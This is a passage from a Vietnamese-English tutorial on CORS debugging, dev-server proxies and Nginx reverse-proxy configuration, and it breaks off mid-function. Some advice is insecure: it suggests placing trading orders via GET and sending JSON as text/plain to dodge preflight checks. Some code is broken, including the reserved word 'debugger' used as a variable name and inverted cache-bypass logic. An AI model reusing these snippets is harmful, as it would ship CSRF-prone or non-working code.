// Scenario: CORS works trong development nhưng fails trong production
// Common causes tôi encountered:

// 1. HTTPS/HTTP mismatch
// Dev: http://localhost:3000 -> http://api.localhost:8000 ✅
// Prod: https://app.com -> http://api.com ❌ (mixed content)

// Debug approach:
console.log('Current protocol:', window.location.protocol);
console.log('API endpoint protocol:', new URL(apiEndpoint).protocol);

// 2. Subdomain issues
// Expected: https://app.company.com -> https://api.company.com
// Actual: https://app.company.com -> https://api-prod.company.com ❌

// Debug approach:
const debugCORS = (url) => {
  const currentOrigin = window.location.origin;
  const targetOrigin = new URL(url).origin;

  console.log('🔍 CORS Debug Info:');
  console.log('Current origin:', currentOrigin);
  console.log('Target origin:', targetOrigin);
  console.log('Same origin?', currentOrigin === targetOrigin);

  if (currentOrigin !== targetOrigin) {
    console.log('🚨 Cross-origin request detected');
    console.log('💡 Check server CORS configuration for origin:', currentOrigin);
  }
};

debugCORS('https://api-prod.company.com/data');
```


**Issue 2: Preflight Request Optimization**


```javascript
// Problem: Excessive preflight requests causing performance issues
// Solution: Preflight request monitoring và optimization

class PreflightOptimizer {
  constructor() {
    this.preflightCount = 0;
    this.preflightTimes = [];
  }

  monitorPreflights() {
    const originalFetch = window.fetch;

    window.fetch = async (...args) => {
      const [url, options] = args;

      if (this.willTriggerPreflight(url, options)) {
        console.log('🔄 Preflight will be triggered for:', url);
        this.preflightCount++;

        const start = performance.now();
        const result = await originalFetch(...args);
        const end = performance.now();

        this.preflightTimes.push(end - start);
        console.log(`⏱️ Preflight + actual request took: ${(end - start).toFixed(2)}ms`);

        return result;
      }

      return originalFetch(...args);
    };
  }

  willTriggerPreflight(url, options = {}) {
    const method = (options.method || 'GET').toUpperCase();
    const headers = options.headers || {};
    const contentType = headers['Content-Type'] || '';

    // Check if it's a complex request
    if (!['GET', 'HEAD', 'POST'].includes(method)) return true;

    // Check custom headers
    const customHeaders = Object.keys(headers).filter(header =>
      !['accept', 'accept-language', 'content-language', 'content-type'].includes(header.toLowerCase())
    );
    if (customHeaders.length > 0) return true;

    // Check content type
    const simpleContentTypes = [
      'application/x-www-form-urlencoded',
      'multipart/form-data',
      'text/plain'
    ];
    if (contentType && !simpleContentTypes.some(type => contentType.includes(type))) {
      return true;
    }

    return false;
  }

  getOptimizationSuggestions() {
    return {
      preflightCount: this.preflightCount,
      averageTime: this.preflightTimes.reduce((a, b) => a + b, 0) / this.preflightTimes.length,
      suggestions: [
        'Consider using simple requests where possible (GET, POST with form data)',
        'Implement proper preflight caching with Access-Control-Max-Age',
        'Batch related API calls to reduce preflight overhead',
        'Use same-origin proxy for development to avoid CORS entirely'
      ]
    };
  }
}

// Usage:
const optimizer = new PreflightOptimizer();
optimizer.monitorPreflights();

// After some usage:
setTimeout(() => {
  console.log('📊 CORS Optimization Report:', optimizer.getOptimizationSuggestions());
}, 30000);
```


**Issue 3: Credential-Enabled CORS Debugging**


```javascript
// Challenge: Cookies không được send khi có CORS request
// Common pitfalls và solutions:

const debugCredentialCORS = () => {
  // Check 1: Access-Control-Allow-Credentials response header
  fetch('https://api.example.com/protected', {
    credentials: 'include'  // ⚠️ Must be explicit
  })
  .then(response => {
    console.log('🍪 Credentials Debug:');
    console.log('Response headers:');

    for (let [key, value] of response.headers) {
      if (key.toLowerCase().includes('access-control')) {
        console.log(`${key}: ${value}`);
      }
    }

    // Check if server allows credentials
    const allowCredentials = response.headers.get('Access-Control-Allow-Credentials');
    if (allowCredentials !== 'true') {
      console.error('❌ Server does not allow credentials');
      console.log('💡 Server must set Access-Control-Allow-Credentials: true');
    }

    // Check origin specificity
    const allowOrigin = response.headers.get('Access-Control-Allow-Origin');
    if (allowOrigin === '*') {
      console.error('❌ Cannot use wildcard origin với credentials');
      console.log('💡 Server must specify exact origin when allowing credentials');
    }
  });

  // Check 2: Current cookies
  console.log('Current cookies:', document.cookie);

  // Check 3: SameSite attribute issues
  console.log('🔍 Check cookie SameSite attributes in DevTools > Application > Cookies');
  console.log('💡 Cross-origin cookies cần SameSite=None; Secure attributes');
};
```


### 🎯 Advanced CORS Interview Questions


**Principal Level Questions:**


**Q1: Design một CORS architecture cho microservices system với 50+ services.**


```javascript
/**
 * Requirements:
 * - 50+ backend services với different security requirements
 * - 10+ frontend applications (web, mobile, admin)
 * - Support cho development, staging, production environments
 * - Performance optimization (minimal preflight requests)
 * - Security isolation between services
 * - Monitoring và alerting cho CORS violations
 */

// Solution approach:
class MicroservicesCORSArchitecture {
  constructor() {
    // Service classification
    this.serviceTypes = {
      'public': {
        origins: ['*'],
        credentials: false,
        methods: ['GET', 'HEAD']
      },
      'user-facing': {
        origins: this.getUserFacingOrigins(),
        credentials: true,
        methods: ['GET', 'POST', 'PUT', 'DELETE']
      },
      'internal': {
        origins: this.getInternalOrigins(),
        credentials: true,
        methods: ['*']
      },
      'admin': {
        origins: this.getAdminOrigins(),
        credentials: true,
        methods: ['*'],
        additionalSecurity: true
      }
    };
  }

  // API Gateway level CORS handling
  setupAPIGatewayCORS() {
    // Implement centralized CORS logic
    // Route-based CORS policies
    // Service discovery integration
  }

  // Service mesh CORS integration
  setupServiceMeshCORS() {
    // Istio/Linkerd CORS configuration
    // Traffic policy definitions
    // Service-to-service communication rules
  }
}
```


**Q2: Optimize CORS performance cho high-traffic trading application.**


```javascript
/**
 * Scenario: Cryptocurrency trading platform
 * - 100,000+ concurrent users
 * - Real-time price updates (WebSocket + HTTP polling)
 * - Order placement APIs (PUT/POST requests triggering preflights)
 * - Performance requirements: <50ms API response time
 */

// Solution strategies:
const tradingCORSOptimization = {
  // 1. Preflight elimination techniques
  eliminatePreflights: {
    // Use simple requests where possible
    simplifyHeaders: {
      // Instead of: Content-Type: application/json
      // Use: Content-Type: text/plain + manual parsing
      method: 'POST',
      headers: { 'Content-Type': 'text/plain' },
      body: JSON.stringify(orderData)
    },

    // Restructure APIs to use GET with query parameters
    getBasedAPIs: {
      // Instead of: POST /api/orders
      // Use: GET /api/orders/place?symbol=BTC&quantity=1&price=50000
    }
  },

  // 2. Strategic preflight caching
  preflightCaching: {
    // Long cache cho stable endpoints
    userProfile: { maxAge: 86400 * 7 },  // 7 days

    // Medium cache cho trading endpoints
    orders: { maxAge: 3600 },            // 1 hour

    // Short cache cho real-time data
    prices: { maxAge: 300 }              // 5 minutes
  },

  // 3. Connection pooling và HTTP/2
  connectionOptimization: {
    // Reuse connections để avoid handshake overhead
    // HTTP/2 multiplexing để reduce preflight impact
    // Keep-alive connections for WebSocket fallback HTTP requests
  }
};
```


**Q3: Debug một complex CORS issue trong production microservices.**


**Scenario:** Users report intermittent CORS failures (works 90% of time, fails 10%)


**Debugging Approach:**


```javascript
// 1. Comprehensive CORS logging
class ProductionCORSDebugger {
  constructor() {
    this.corsLogs = [];
    this.failurePatterns = new Map();
  }

  logCORSRequest(req, res, next) {
    const logEntry = {
      timestamp: Date.now(),
      origin: req.headers.origin,
      method: req.method,
      path: req.path,
      userAgent: req.headers['user-agent'],
      ip: req.ip,
      headers: req.headers,
      serverId: process.env.SERVER_ID, // Load balancer tracking
      responseHeaders: {}  // To be filled after response
    };

    // Capture response headers
    const originalSetHeader = res.setHeader.bind(res);
    res.setHeader = (name, value) => {
      logEntry.responseHeaders[name] = value;
      return originalSetHeader(name, value);
    };

    res.on('finish', () => {
      logEntry.statusCode = res.statusCode;
      this.analyzeCORSPattern(logEntry);
    });

    next();
  }

  analyzeCORSPattern(logEntry) {
    // Pattern detection for intermittent failures
    if (logEntry.statusCode >= 400) {
      const pattern = `${logEntry.origin}:${logEntry.method}:${logEntry.path}`;
      const failures = this.failurePatterns.get(pattern) || [];
      failures.push(logEntry);
      this.failurePatterns.set(pattern, failures);

      // Alert if failure rate exceeds threshold
      if (failures.length > 10 && this.getFailureRate(pattern) > 0.05) {
        this.alertHighFailureRate(pattern, failures);
      }
    }
  }
}

// 2. Load balancer CORS consistency check
const checkLoadBalancerCORS = async () => {
  const endpoints = [
    'https://api1.company.com',
    'https://api2.company.com',
    'https://api3.company.com'
  ];

  const corsCheck = await Promise.all(endpoints.map(async (endpoint) => {
    const response = await fetch(`${endpoint}/health`, {
      method: 'OPTIONS',
      headers: { 'Origin': 'https://app.company.com' }
    });

    return {
      endpoint,
      allowOrigin: response.headers.get('Access-Control-Allow-Origin'),
      allowMethods: response.headers.get('Access-Control-Allow-Methods'),
      allowHeaders: response.headers.get('Access-Control-Allow-Headers'),
      maxAge: response.headers.get('Access-Control-Max-Age')
    };
  }));

  // Check for inconsistencies
  const inconsistencies = this.findCORSInconsistencies(corsCheck);
  if (inconsistencies.length > 0) {
    console.error('🚨 CORS Configuration Inconsistencies:', inconsistencies);
  }
};
```


---


## 📖 PHẦN IV: ADVANCED CROSS-DOMAIN SOLUTIONS


### 🌱 5. DEVELOPMENT ENVIRONMENT PROXIES


#### 🔬 Proxy Mechanisms - Architecture & Implementation


**The Fundamental Concept:**


Development proxies solve cross-origin problems bằng cách create một **same-origin facade** cho external APIs. Thay vì browser directly request `https://api.example.com`, nó requests `http://localhost:3000/api/proxy`, và proxy server forwards request đến actual API.


```javascript
// Without proxy (CORS issues):
// Frontend (http://localhost:3000) -> API (https://api.example.com) ❌

// With proxy (same-origin):
// Frontend (http://localhost:3000) -> Proxy (http://localhost:3000/api) -> API (https://api.example.com) ✅
```


**Webpack Dev Server Proxy - Deep Implementation Analysis:**


```javascript
// webpack.config.js
module.exports = {
  devServer: {
    proxy: {
      '/api': {
        target: 'https://api.example.com',
        changeOrigin: true,
        pathRewrite: {
          '^/api': ''  // Remove /api prefix when forwarding
        },
        onProxyReq: (proxyReq, req, res) => {
          // Modify outgoing request
          console.log('Proxying:', req.method, req.url, '->', proxyReq.path);

          // Add custom headers
          proxyReq.setHeader('X-Forwarded-For', req.ip);
          proxyReq.setHeader('X-Original-Host', req.headers.host);
        },
        onProxyRes: (proxyRes, req, res) => {
          // Modify incoming response
          console.log('Response from API:', proxyRes.statusCode);

          // Remove CORS headers (not needed anymore)
          delete proxyRes.headers['access-control-allow-origin'];
          delete proxyRes.headers['access-control-allow-credentials'];
        },
        onError: (err, req, res) => {
          console.error('Proxy error:', err.message);
          res.writeHead(500, { 'Content-Type': 'text/plain' });
          res.end('Proxy error: ' + err.message);
        }
      }
    }
  }
};

// Internal implementation (simplified):
class WebpackDevServerProxy {
  constructor(config) {
    this.httpProxy = require('http-proxy-middleware');
    this.proxyConfig = config;
  }

  createProxyMiddleware(context, options) {
    return this.httpProxy(context, {
      target: options.target,
      changeOrigin: options.changeOrigin,

      // Path rewriting logic
      pathRewrite: (path, req) => {
        if (options.pathRewrite) {
          for (const [pattern, replacement] of Object.entries(options.pathRewrite)) {
            path = path.replace(new RegExp(pattern), replacement);
          }
        }
        return path;
      },

      // Request transformation
      onProxyReq: (proxyReq, req, res) => {
        // Handle body for POST/PUT requests
        if (req.body && (req.method === 'POST' || req.method === 'PUT')) {
          const bodyData = JSON.stringify(req.body);
          proxyReq.setHeader('Content-Type', 'application/json');
          proxyReq.setHeader('Content-Length', Buffer.byteLength(bodyData));
          proxyReq.write(bodyData);
        }

        if (options.onProxyReq) {
          options.onProxyReq(proxyReq, req, res);
        }
      }
    });
  }
}
```


**Vite Proxy Configuration - Modern Approach:**


```javascript
// vite.config.js
export default {
  server: {
    proxy: {
      // String shorthand
      '/api': 'http://localhost:4000',

      // Object configuration
      '/api/v2': {
        target: 'http://localhost:4001',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/api\/v2/, '')
      },

      // Advanced configuration với custom logic
      '/websocket': {
        target: 'ws://localhost:8080',
        ws: true,  // Enable WebSocket proxying
        changeOrigin: true,
        configure: (proxy, options) => {
          // Custom proxy event handlers
          proxy.on('error', (err, req, res) => {
            console.log('Proxy error:', err);
          });

          proxy.on('proxyReq', (proxyReq, req, res) => {
            console.log('Sending Request:', req.method, req.url);
          });

          proxy.on('proxyRes', (proxyRes, req, res) => {
            console.log('Received Response:', proxyRes.statusCode, req.url);
          });
        }
      },

      // Regex-based routing
      '^/fallback/.*': {
        target: 'http://localhost:9000',
        changeOrigin: true,
        rewrite: (path) => path.replace(/^\/fallback/, '/api')
      }
    }
  }
};
```


#### 💡 Production-Grade Proxy Patterns


**Pattern 1: Multi-Environment Proxy Configuration**


```javascript
// config/proxy.js
const environments = {
  development: {
    api: 'http://localhost:8000',
    auth: 'http://localhost:8001',
    websocket: 'ws://localhost:8002'
  },
  staging: {
    api: 'https://staging-api.company.com',
    auth: 'https://staging-auth.company.com',
    websocket: 'wss://staging-ws.company.com'
  },
  production: {
    // No proxy needed - same origin deployment
    api: null,
    auth: null,
    websocket: null
  }
};

class EnvironmentProxyManager {
  constructor(environment = 'development') {
    this.env = environment;
    this.config = environments[environment];
  }

  generateProxyConfig() {
    if (!this.config.api) {
      return {}; // No proxy needed for production
    }

    return {
      '/api': {
        target: this.config.api,
        changeOrigin: true,
        secure: this.env !== 'development',
        logLevel: this.env === 'development' ? 'debug' : 'warn'
      },

      '/auth': {
        target: this.config.auth,
        changeOrigin: true,
        secure: this.env !== 'development',
        cookieDomainRewrite: this.env === 'development' ? 'localhost' : false
      },

      '/ws': {
        target: this.config.websocket,
        ws: true,
        changeOrigin: true,
        secure: this.env !== 'development'
      }
    };
  }

  // Validation để ensure proxy targets are reachable
  async validateProxyTargets() {
    const targets = Object.values(this.config).filter(Boolean);
    const results = await Promise.allSettled(
      targets.map(target => this.pingTarget(target))
    );

    results.forEach((result, index) => {
      if (result.status === 'rejected') {
        console.warn(`⚠️ Proxy target unreachable: ${targets[index]}`);
      }
    });
  }

  async pingTarget(target) {
    // Simple health check implementation
    const url = target.replace(/^ws/, 'http'); // Convert WebSocket to HTTP for health check
    const response = await fetch(`${url}/health`, {
      method: 'HEAD',
      timeout: 5000
    });

    if (!response.ok) {
      throw new Error(`Target ${target} returned ${response.status}`);
    }
  }
}
```


**Pattern 2: Request/Response Transformation Pipeline**


```javascript
// Advanced proxy với request/response transformation
class ProxyTransformPipeline {
  constructor() {
    this.requestTransforms = [];
    this.responseTransforms = [];
  }

  addRequestTransform(transform) {
    this.requestTransforms.push(transform);
  }

  addResponseTransform(transform) {
    this.responseTransforms.push(transform);
  }

  createProxyHandler() {
    return {
      onProxyReq: async (proxyReq, req, res) => {
        // Apply request transformations
        for (const transform of this.requestTransforms) {
          await transform(proxyReq, req, res);
        }
      },

      onProxyRes: async (proxyRes, req, res) => {
        // Apply response transformations
        for (const transform of this.responseTransforms) {
          await transform(proxyRes, req, res);
        }
      }
    };
  }
}

// Usage example:
const pipeline = new ProxyTransformPipeline();

// Add authentication injection
pipeline.addRequestTransform(async (proxyReq, req, res) => {
  if (!proxyReq.getHeader('Authorization')) {
    const token = await getDevToken(); // Get development token
    proxyReq.setHeader('Authorization', `Bearer ${token}`);
  }
});

// Add response mocking cho unavailable endpoints
pipeline.addResponseTransform(async (proxyRes, req, res) => {
  if (proxyRes.statusCode === 404 && req.url.includes('/api/beta/')) {
    // Mock response cho beta endpoints not yet implemented
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      message: 'Mocked response for development',
      data: generateMockData(req.url)
    }));
  }
});

// Apply to Vite config:
export default {
  server: {
    proxy: {
      '/api': {
        target: 'https://api.company.com',
        changeOrigin: true,
        configure: (proxy) => {
          const handler = pipeline.createProxyHandler();
          proxy.on('proxyReq', handler.onProxyReq);
          proxy.on('proxyRes', handler.onProxyRes);
        }
      }
    }
  }
};
```


#### 🔍 Advanced Debugging & Monitoring


**Proxy Request Debugging:**


```javascript
// Comprehensive proxy debugging utility
class ProxyDebugger {
  constructor(options = {}) {
    this.logLevel = options.logLevel || 'info';
    this.logRequests = options.logRequests !== false;
    this.logResponses = options.logResponses !== false;
    this.logErrors = options.logErrors !== false;
    this.performanceTracking = options.performanceTracking || false;

    this.requestTimes = new Map();
    this.errorCounts = new Map();
  }

  attachToProxy(proxyConfig) {
    const originalOnProxyReq = proxyConfig.onProxyReq;
    const originalOnProxyRes = proxyConfig.onProxyRes;
    const originalOnError = proxyConfig.onError;

    proxyConfig.onProxyReq = (proxyReq, req, res) => {
      if (this.logRequests) {
        this.logRequest(proxyReq, req);
      }

      if (this.performanceTracking) {
        this.requestTimes.set(req.url, Date.now());
      }

      if (originalOnProxyReq) {
        originalOnProxyReq(proxyReq, req, res);
      }
    };

    proxyConfig.onProxyRes = (proxyRes, req, res) => {
      if (this.logResponses) {
        this.logResponse(proxyRes, req);
      }

      if (this.performanceTracking) {
        this.trackResponseTime(req.url);
      }

      if (originalOnProxyRes) {
        originalOnProxyRes(proxyRes, req, res);
      }
    };

    proxyConfig.onError = (err, req, res) => {
      if (this.logErrors) {
        this.logError(err, req);
      }

      this.trackError(req.url, err);

      if (originalOnError) {
        originalOnError(err, req, res);
      } else {
        // Default error handling
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end(`Proxy Error: ${err.message}`);
      }
    };
  }

  logRequest(proxyReq, req) {
    console.log(`🔄 PROXY REQ: ${req.method} ${req.url}`);
    console.log(`   -> ${proxyReq.protocol}//${proxyReq.host}${proxyReq.path}`);

    if (this.logLevel === 'debug') {
      console.log('   Headers:', req.headers);
      if (req.body) {
        console.log('   Body:', JSON.stringify(req.body, null, 2));
      }
    }
  }

  logResponse(proxyRes, req) {
    const statusColor = proxyRes.statusCode >= 400 ? '🔴' :
                       proxyRes.statusCode >= 300 ? '🟡' : '🟢';

    console.log(`${statusColor} PROXY RES: ${proxyRes.statusCode} ${req.method} ${req.url}`);

    if (this.logLevel === 'debug') {
      console.log('   Response Headers:', proxyRes.headers);
    }
  }

  logError(err, req) {
    console.error(`❌ PROXY ERROR: ${req.method} ${req.url}`);
    console.error(`   Error: ${err.message}`);
    console.error(`   Code: ${err.code}`);

    if (this.logLevel === 'debug' && err.stack) {
      console.error('   Stack:', err.stack);
    }
  }

  trackResponseTime(url) {
    const startTime = this.requestTimes.get(url);
    if (startTime) {
      const duration = Date.now() - startTime;
      console.log(`⏱️ Response time: ${duration}ms for ${url}`);
      this.requestTimes.delete(url);
    }
  }

  trackError(url, error) {
    const key = `${url}:${error.message}`;
    const count = this.errorCounts.get(key) || 0;
    this.errorCounts.set(key, count + 1);

    if (count > 5) {
      console.warn(`⚠️ High error rate detected for ${url}: ${count} errors`);
    }
  }

  getStats() {
    return {
      activeRequests: this.requestTimes.size,
      errorCounts: Object.fromEntries(this.errorCounts),
      mostCommonErrors: [...this.errorCounts.entries()]
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5)
    };
  }
}

// Usage:
const debugger = new ProxyDebugger({
  logLevel: 'debug',
  performanceTracking: true
});

const proxyConfig = {
  '/api': {
    target: 'https://api.example.com',
    changeOrigin: true
  }
};

debugger.attachToProxy(proxyConfig['/api']);

// Monitor proxy stats
setInterval(() => {
  const stats = debugger.getStats();
  if (stats.activeRequests > 0 || Object.keys(stats.errorCounts).length > 0) {
    console.log('📊 Proxy Stats:', stats);
  }
}, 30000);
```


### 🌱 6. NGINX REVERSE PROXY - PRODUCTION ARCHITECTURE


#### 🔬 Nginx CORS Implementation - Deep Dive


**The Architecture Pattern:**


Nginx reverse proxy pattern for cross-origin issues involves placing Nginx như một **unified frontend** cho all backend services. Từ browser perspective, tất cả requests đều same-origin.


```
┌─────────────┐    ┌─────────────┐    ┌──────────────┐
│   Browser   │    │    Nginx    │    │   Backend    │
│             │    │  (Proxy)    │    │   Services   │
├─────────────┤    ├─────────────┤    ├──────────────┤
│ Origin:     │───▶│ Location:   │───▶│ api-1.com    │
│ myapp.com   │    │ /api/v1/    │    │ api-2.com    │
│             │    │ /api/v2/    │    │ api-3.com    │
│             │    │ /ws/        │    │ ws.com       │
└─────────────┘    └─────────────┘    └──────────────┘
```


**Core Nginx Configuration:**


```nginx
# /etc/nginx/sites-available/myapp
server {
    listen 80;
    listen 443 ssl http2;
    server_name myapp.com;

    # SSL configuration
    ssl_certificate /path/to/certificate.crt;
    ssl_certificate_key /path/to/private.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;

    # Security headers
    add_header X-Frame-Options DENY;
    add_header X-Content-Type-Options nosniff;
    add_header X-XSS-Protection "1; mode=block";
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    # CORS headers for cross-origin requests (if needed)
    location / {
        # Serve static frontend files
        root /var/www/myapp/dist;
        try_files $uri $uri/ /index.html;

        # Basic CORS support for static assets
        if ($request_method = 'OPTIONS') {
            add_header Access-Control-Allow-Origin '*';
            add_header Access-Control-Allow-Methods 'GET, POST, PUT, DELETE, OPTIONS';
            add_header Access-Control-Allow-Headers 'DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range,Authorization';
            add_header Access-Control-Max-Age 1728000;
            add_header Content-Type 'text/plain; charset=utf-8';
            add_header Content-Length 0;
            return 204;
        }
    }

    # API proxy configuration
    location /api/v1/ {
        proxy_pass http://backend-api-v1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # CORS configuration cho API endpoints
        add_header Access-Control-Allow-Origin $cors_origin always;
        add_header Access-Control-Allow-Credentials true always;
        add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS" always;
        add_header Access-Control-Allow-Headers "DNT,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Range,Authorization,X-API-Key" always;

        # Handle preflight requests
        if ($request_method = OPTIONS) {
            add_header Access-Control-Max-Age 1728000;
            add_header Content-Type 'text/plain; charset=utf-8';
            add_header Content-Length 0;
            return 204;
        }
    }

    location /api/v2/ {
        proxy_pass http://backend-api-v2;
        include /etc/nginx/proxy_params;

        # Different CORS policy for v2 API
        set $cors_origin "";
        if ($http_origin ~* "^https?://(localhost:\d+|.*\.mycompany\.com|myapp\.com)$") {
            set $cors_origin $http_origin;
        }

        add_header Access-Control-Allow-Origin $cors_origin always;
        add_header Access-Control-Allow-Credentials true always;
    }

    # WebSocket proxy
    location /ws/ {
        proxy_pass http://websocket-backend;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # WebSocket timeout configuration
        proxy_read_timeout 86400;
        proxy_send_timeout 86400;
    }
}

# Upstream definitions
upstream backend-api-v1 {
    least_conn;
    server api-v1-1.internal:8000 max_fails=3 fail_timeout=30s;
    server api-v1-2.internal:8000 max_fails=3 fail_timeout=30s;
    server api-v1-3.internal:8000 max_fails=3 fail_timeout=30s backup;
}

upstream backend-api-v2 {
    ip_hash;  # Session affinity
    server api-v2-1.internal:8001 weight=3;
    server api-v2-2.internal:8001 weight=2;
}

upstream websocket-backend {
    server ws-1.internal:9000;
    server ws-2.internal:9000;
}
```


#### 💡 Advanced Nginx CORS Patterns


**Pattern 1: Dynamic CORS Origin Validation**


```nginx
# Advanced origin validation với map module
map $http_origin $cors_origin {
    default "";

    # Production domains
    "https://myapp.com" "https://myapp.com";
    "https://www.myapp.com" "https://www.myapp.com";
    "https://admin.myapp.com" "https://admin.myapp.com";

    # Development domains (regex)
    "~^https?://localhost:\d+$" $http_origin;
    "~^https://[\w-]+\.vercel\.app$" $http_origin;
    "~^https://[\w-]+\.netlify\.app$" $http_origin;

    # Staging environments
    "~^https://[\w-]+\.staging\.myapp\.com$" $http_origin;
}

# Different CORS policies cho different API versions
map $uri $cors_credentials {
    default "false";

    # v1 API: No credentials
    "~^/api/v1/" "false";

    # v2 API: Allow credentials
    "~^/api/v2/" "true";

    # Admin API: Strict credentials
    "~^/api/admin/" "true";
}

map $uri $cors_methods {
    default "GET, HEAD, OPTIONS";

    # Public API: Limited methods
    "~^/api/public/" "GET, HEAD, OPTIONS";

    # User API: Standard CRUD
    "~^/api/v[12]/" "GET, POST, PUT, DELETE, OPTIONS";

    # Admin API: Full access
    "~^/api/admin/" "GET, POST, PUT, DELETE, PATCH, OPTIONS";
}

# Apply trong server block:
location /api/ {
    # Dynamic CORS headers
    add_header Access-Control-Allow-Origin $cors_origin always;
    add_header Access-Control-Allow-Credentials $cors_credentials always;
    add_header Access-Control-Allow-Methods $cors_methods always;

    if ($request_method = OPTIONS) {
        add_header Access-Control-Max-Age 1728000;
        add_header Content-Length 0;
        return 204;
    }

    proxy_pass http://backend;
}
```


**Pattern 2: High-Performance CORS với Caching**


```nginx
# CORS response caching để reduce server load
proxy_cache_path /var/cache/nginx/cors
    levels=1:2
    keys_zone=cors_cache:10m
    max_size=100m
    inactive=24h;

server {
    location /api/ {
        # Cache preflight responses
        set $cache_cors "";
        if ($request_method = OPTIONS) {
            set $cache_cors "1";
        }

        proxy_cache cors_cache;
        proxy_cache_valid 200 24h;
        proxy_cache_key "$scheme$request_method$host$uri$is_args$args$http_origin";
        proxy_cache_methods OPTIONS;

        # Only cache if CORS request
        proxy_cache_bypass $cache_cors;
        proxy_no_cache $cache_cors;

        # Standard proxy settings
        proxy_pass http://backend;

        # CORS headers
        add_header Access-Control-Allow-Origin $cors_origin always;
        add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS" always;
        add_header Access-Control-Allow-Headers "Content-Type, Authorization" always;
        add_header Access-Control-Max-Age 86400 always;

        # Cache status header for debugging
        add_header X-Cache-Status $upstream_cache_status always;
    }
}
```


**Pattern 3: Security-Enhanced CORS Configuration**


```nginx
# Enhanced security với rate limiting và monitoring
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
limit_req_zone $http_origin zone=cors:10m rate=60r/m;

# GeoIP blocking (optional)
geo $blocked_country {
    default 0;
    # Block specific countries if needed
    # CN 1;  # Block China
    # RU 1;  # Block Russia
}

server {
    location /api/ {
        # Block requests từ blocked countries
        if ($blocked_country) {
            return 403;
        }

        # Rate limiting
        limit_req zone=api burst=20 nodelay;
        limit_req zone=cors burst=10 nodelay;

        # Origin validation với security logging
        set $origin_valid "";
        if ($http_origin ~* "^https?://(localhost:\d+|.*\.trusted-domain\.com)$") {
            set $origin_valid "1";
        }

        # Log suspicious requests
        if ($origin_valid = "") {
            access_log /var/log/nginx/cors_violations.log combined;
        }

        # Only allow CORS for validated origins
        set $cors_headers "";
        if ($origin_valid = "1") {
            set $cors_headers "1";
        }

        # Conditional CORS headers
        if ($cors_headers = "1") {
            add_header Access-Control-Allow-Origin $http_origin always;
            add_header Access-Control-Allow-Credentials true always;
            add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS" always;
            add_header Access-Control-Allow-Headers "Content-Type, Authorization, X-API-Key" always;
        }

        # Security headers
        add_header X-Frame-Options DENY always;
        add_header X-Content-Type-Options nosniff always;
        add_header Referrer-Policy strict-origin-when-cross-origin always;

        proxy_pass http://backend;
    }
}
```


#### 🔍 Production Monitoring & Debugging


**CORS Monitoring Configuration:**


```nginx
# Custom log format for CORS analysis
log_format cors_log '$remote_addr - $remote_user [$time_local] '
                   '"$request" $status $body_bytes_sent '
                   '"$http_referer" "$http_user_agent" '
                   '"$http_origin" "$sent_http_access_control_allow_origin" '
                   '$request_time $upstream_response_time';

# Separate log files cho different scenarios
server {
    location /api/ {
        # Log all CORS requests
        if ($http_origin != "") {
            access_log /var/log/nginx/cors_requests.log cors_log;
        }

        # Log preflight requests specifically
        if ($request_method = OPTIONS) {
            access_log /var/log/nginx/preflight_requests.log cors_log;
        }

        # Log blocked origins
        set $cors_blocked "";
        if ($cors_origin = "") {
            set $cors_blocked "1";
        }
        if ($cors_blocked = "1") {
            access_log /var/log/nginx/cors_blocked.log cors_log;
        }
    }
}
```


**Nginx CORS Debugging Tools:**


```bash
#!/bin/bash
# cors-debug.sh - CORS debugging script for Nginx

echo "🔍 CORS Debug Information"
echo "========================"

# Check Nginx configuration syntax
echo "1. Checking Nginx configuration..."
nginx -t

# Test CORS headers for specific origin
test_cors() {
    local origin=$1
    local url=$2

    echo "2. Testing CORS for origin: $origin"
    echo "   URL: $url"

    # Test preflight request
    echo "   Preflight (OPTIONS):"
    curl -H "Origin: $origin" \
         -H "Access-Control-Request-Method: POST" \
         -H "Access-Control-Request-Headers: Content-Type" \
         -X OPTIONS \
         -I "$url" 2>/dev/null | grep -i "access-control"

    # Test actual request
    echo "   Actual request (POST):"
    curl -H "Origin: $origin" \
         -H "Content-Type: application/json" \
         -X POST \
         -d '{"test": true}' \
         -I "$url" 2>/dev/null | grep -i "access-control"
}

# Test different origins
test_cors "https://myapp.com" "https://api.myapp.com/api/v1/test"
test_cors "https://localhost:3000" "https://api.myapp.com/api/v1/test"
test_cors "https://malicious.com" "https://api.myapp.com/api/v1/test"

# Check recent CORS logs
echo "3. Recent CORS activity:"
echo "   Successful requests:"
tail -n 10 /var/log/nginx/cors_requests.log | grep " 200 "

echo "   Blocked requests:"
tail -n 10 /var/log/nginx/cors_blocked.log

echo "   Preflight requests:"
tail -n 10 /var/log/nginx/preflight_requests.log

# Performance analysis
echo "4. CORS Performance Analysis:"
echo "   Average preflight response time:"
awk '{print $15}' /var/log/nginx/preflight_requests.log | \
    awk '{sum+=$1; count++} END {print sum/count " seconds"}'

echo "   Most common blocked origins:"
awk '{print $10}' /var/log/nginx/cors_blocked.log | \
    sort | uniq -c | sort -rn | head -5
```


**Automated CORS Configuration Testing:**


```javascript
// cors-test.js - Automated CORS testing
const puppeteer = require('puppeteer');
const axios = require('axios');

class CORSTestSuite {
  constructor(baseUrl) {
    this.baseUrl = baseUrl;
    this.testResults = [];
  }

  async testCORSConfiguration() {
    console.log('🧪 Starting CORS Test Suite');

